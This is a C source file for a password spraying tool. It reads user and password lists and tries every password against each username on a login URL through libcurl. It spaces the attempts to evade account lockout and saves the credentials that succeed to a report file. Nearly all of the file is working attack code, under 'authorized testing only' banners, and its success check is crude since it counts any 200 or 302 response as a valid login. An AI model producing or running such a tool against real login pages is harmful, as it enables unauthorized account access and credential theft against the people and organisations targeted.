#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <time.h>

#define MAX_USERS 1000
#define MAX_PASSWORDS 100
#define MAX_USERNAME_LENGTH 50
#define MAX_PASSWORD_LENGTH 50
#define MAX_URL_LENGTH 200

typedef struct {
    char username[MAX_USERNAME_LENGTH];
    char password[MAX_PASSWORD_LENGTH];
    int success;
    double response_time;
    int status_code;
} SprayResult;

typedef struct {
    char users[MAX_USERS][MAX_USERNAME_LENGTH];
    char passwords[MAX_PASSWORDS][MAX_PASSWORD_LENGTH];
    int user_count;
    int password_count;
    SprayResult results[MAX_USERS * MAX_PASSWORDS];
    int result_count;
} SpraySession;

// Callback function for CURL writes
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

int spray_single_target(const char* url, const char* username, const char* password, SprayResult* result) {
    CURL *curl;
    CURLcode res;
    char post_data[256];
    struct timespec start, end;
    
    // Initialize result
    strncpy(result->username, username, MAX_USERNAME_LENGTH - 1);
    strncpy(result->password, password, MAX_PASSWORD_LENGTH - 1);
    result->success = 0;
    
    curl = curl_easy_init();
    if(curl) {
        // Prepare POST data (simplified for example)
        snprintf(post_data, sizeof(post_data), "username=%s&password=%s", username, password);
        
        // Set CURL options
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
        
        // Start timer
        clock_gettime(CLOCK_MONOTONIC, &start);
        
        // Perform request
        res = curl_easy_perform(curl);
        
        // End timer
        clock_gettime(CLOCK_MONOTONIC, &end);
        
        if(res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            result->status_code = response_code;
            result->response_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
            
            // Simple success detection (in real implementation, check response content)
            if(response_code == 302 || response_code == 200) {
                result->success = 1;
            }
        }
        
        curl_easy_cleanup(curl);
        return 0;
    }
    
    return -1;
}

int load_users(const char* filename, SpraySession* session) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        printf("Error: Cannot open user file %s\n", filename);
        return -1;
    }
    
    session->user_count = 0;
    char line[256];
    
    while (fgets(line, sizeof(line), file) && session->user_count < MAX_USERS) {
        // Remove newline
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 0) {
            strncpy(session->users[session->user_count], line, MAX_USERNAME_LENGTH - 1);
            session->user_count++;
        }
    }
    
    fclose(file);
    printf("Loaded %d users from %s\n", session->user_count, filename);
    return session->user_count;
}

int load_passwords(const char* filename, SpraySession* session) {
    FILE* file = fopen(filename, "r");
    if (!file) {
        printf("Error: Cannot open password file %s\n", filename);
        return -1;
    }
    
    session->password_count = 0;
    char line[256];
    
    while (fgets(line, sizeof(line), file) && session->password_count < MAX_PASSWORDS) {
        // Remove newline
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 0) {
            strncpy(session->passwords[session->password_count], line, MAX_PASSWORD_LENGTH - 1);
            session->password_count++;
        }
    }
    
    fclose(file);
    printf("Loaded %d passwords from %s\n", session->password_count, filename);
    return session->password_count;
}

void conduct_spray_attack(SpraySession* session, const char* target_url, int delay_seconds) {
    printf("Starting password spray attack\n");
    printf("Target: %s\n", target_url);
    printf("Users: %d, Passwords: %d\n", session->user_count, session->password_count);
    printf("Delay between passwords: %d seconds\n", delay_seconds);
    printf("FOR AUTHORIZED TESTING ONLY\n\n");
    
    session->result_count = 0;
    int successful_logins = 0;
    
    for (int p = 0; p < session->password_count; p++) {
        printf("Spraying with password: %s\n", session->passwords[p]);
        
        for (int u = 0; u < session->user_count && session->result_count < (MAX_USERS * MAX_PASSWORDS); u++) {
            SprayResult* result = &session->results[session->result_count];
            
            if (spray_single_target(target_url, session->users[u], session->passwords[p], result) == 0) {
                if (result->success) {
                    printf("SUCCESS: %s:%s\n", result->username, result->password);
                    successful_logins++;
                }
                
                session->result_count++;
            }
            
            // Small delay between requests
            struct timespec ts = {0, 100000000}; // 100ms
            nanosleep(&ts, NULL);
        }
        
        // Major delay between password changes
        if (p < session->password_count - 1) {
            printf("Waiting %d seconds before next password...\n", delay_seconds);
            for (int i = delay_seconds; i > 0; i--) {
                printf("\r%d... ", i);
                fflush(stdout);
                sleep(1);
            }
            printf("\n");
        }
    }
    
    printf("\nSpray attack completed\n");
    printf("Total attempts: %d\n", session->result_count);
    printf("Successful logins: %d\n", successful_logins);
}

void generate_report(const SpraySession* session, const char* output_file) {
    FILE* report = fopen(output_file, "w");
    if (!report) {
        printf("Error: Cannot create report file %s\n", output_file);
        return;
    }
    
    fprintf(report, "Password Spraying Report\n");
    fprintf(report, "=======================\n\n");
    
    fprintf(report, "Summary:\n");
    fprintf(report, "Total attempts: %d\n", session->result_count);
    
    int successful_logins = 0;
    for (int i = 0; i < session->result_count; i++) {
        if (session->results[i].success) {
            successful_logins++;
        }
    }
    
    fprintf(report, "Successful logins: %d\n", successful_logins);
    fprintf(report, "Success rate: %.2f%%\n", 
            (successful_logins * 100.0) / session->result_count);
    
    if (successful_logins > 0) {
        fprintf(report, "\nSuccessful Credentials:\n");
        for (int i = 0; i < session->result_count; i++) {
            if (session->results[i].success) {
                fprintf(report, "  %s:%s (Response: %.2fs)\n",
                        session->results[i].username,
                        session->results[i].password,
                        session->results[i].response_time);
            }
        }
    }
    
    fclose(report);
    printf("Report saved to: %s\n", output_file);
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        printf("Usage: %s <user_file> <password_file> <target_url> <delay_seconds>\n", argv[0]);
        printf("Example: %s users.txt passwords.txt https://login.company.com 60\n");
        return 1;
    }
    
    printf("Password Spraying Tool - C Implementation\n");
    printf("FOR AUTHORIZED SECURITY TESTING ONLY\n\n");
    
    // Initialize CURL
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    SpraySession session = {0};
    
    // Load credentials
    if (load_users(argv[1], &session) <= 0) {
        printf("Failed to load users\n");
        return 1;
    }
    
    if (load_passwords(argv[2], &session) <= 0) {
        printf("Failed to load passwords\n");
        return 1;
    }
    
    int delay_seconds = atoi(argv[4]);
    if (delay_seconds < 10) {
        printf("Warning: Delay too short (%d seconds). Recommended: 60+ seconds\n", delay_seconds);
    }
    
    // Confirm before proceeding
    printf("\nAbout to spray %d users with %d passwords against %s\n", 
           session.user_count, session.password_count, argv[3]);
    printf("This will take approximately %d minutes\n", 
           (session.password_count * delay_seconds) / 60);
    printf("Continue? (y/N): ");
    
    char response[10];
    fgets(response, sizeof(response), stdin);
    
    if (response[0] != 'y' && response[0] != 'Y') {
        printf("Operation cancelled\n");
        return 0;
    }
    
    // Conduct spray attack
    conduct_spray_attack(&session, argv[3], delay_seconds);
    
    // Generate report
    generate_report(&session, "spray_report.txt");
    
    // Cleanup
    curl_global_cleanup();
    
    return 0;
}
